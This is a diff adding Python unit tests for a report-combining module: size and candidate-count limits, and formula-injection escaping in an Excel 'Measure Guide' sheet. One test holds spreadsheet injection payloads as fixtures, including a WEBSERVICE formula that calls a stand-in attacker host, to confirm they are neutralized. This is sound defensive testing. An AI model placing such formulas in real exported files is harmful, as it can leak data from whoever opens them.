@@ -9,7 +9,12 @@ from unittest.mock import patch
 import openpyxl
 
 from analysis.native_face import NATIVE_FACE_METRICS
-from analysis.video import CanonicalVideoResult, DetectedVideoSource, VideoMetricProvenance
+from analysis.video import (
+    CanonicalVideoResult,
+    DetectedVideoSource,
+    VideoMetricProvenance,
+    VideoOutputProvenance,
+)
 from analysis.video_contract import VIDEO_NORMALIZATION_VERSION
 from analysis.video_contract import VIDEO_COMMON_METRICS
 from analysis.combined_summary import (
@@ -32,6 +37,8 @@ from analysis.combined_summary import (
     build_combined_workbook,
     discover_combined_sources,
     protected_manual_discovery_directories,
+    parse_sectioned_csv,
+    _write_measure_guide,
 )
 
 
@@ -77,6 +84,59 @@ class CombinedSummaryTests(unittest.TestCase):
 
     def tearDown(self) -> None:
         self.temp_dir.cleanup()
+
+    def test_sectioned_csv_import_is_bounded_before_full_parse(self) -> None:
+        report = self.root / "oversized.csv"
+        report.write_bytes(b"Metric\n" + b"x" * 64)
+        with patch("analysis.combined_summary.MAX_IMPORTED_REPORT_BYTES", 16):
+            with self.assertRaisesRegex(InputError, "exceeds.*16"):
+                parse_sectioned_csv(report)
+
+    def test_combined_discovery_bounds_candidate_count_before_sorting(self) -> None:
+        with patch("analysis.combined_summary.MAX_COMBINED_REPORT_CANDIDATES", 1):
+            with self.assertRaisesRegex(InputError, "candidate count.*1"):
+                discover_combined_sources(self.audio_emotion_root, "audio")
+
+    def test_combined_discovery_bounds_aggregate_candidate_bytes(self) -> None:
+        with patch("analysis.combined_summary.MAX_COMBINED_REPORT_CANDIDATE_BYTES", 1):
+            with self.assertRaisesRegex(InputError, "cumulative.*byte.*1"):
+                discover_combined_sources(self.audio_emotion_root, "audio")
+
+    def test_measure_guide_neutralizes_provider_controlled_formula_text(self) -> None:
+        provenance = VideoOutputProvenance(
+            requested_modality="video",
+            resolved_provider="imotions_affdex",
+            source_method="import",
+            source_path=self.root,
+            detection_evidence=("=WEBSERVICE(\"https://attacker.invalid\")",),
+            detection_warnings=("@SUM(1+1)",),
+            normalization_contract_version="+malicious",
+            canonical_availability=(),
+            original_columns=(
+                VideoMetricProvenance("source-0001", "Anger", "=1+1", "-2+3"),
+            ),
+        )
+        book = openpyxl.Workbook()
+        book.remove(book.active)
+
+        _write_measure_guide(book, (provenance,))
+
+        guide = book["Measure Guide"]
+        dynamic_values = {
+            cell.value
+            for row in guide.iter_rows(min_row=2)
+            for cell in row
+            if isinstance(cell.value, str)
+        }
+        for dangerous in (
+            "=WEBSERVICE(\"https://attacker.invalid\")",
+            "@SUM(1+1)",
+            "+malicious",
+            "=1+1",
+            "-2+3",
+        ):
+            self.assertNotIn(dangerous, dynamic_values)
+            self.assertIn("'" + dangerous, dynamic_values)
 
     def _write_report(
         self,
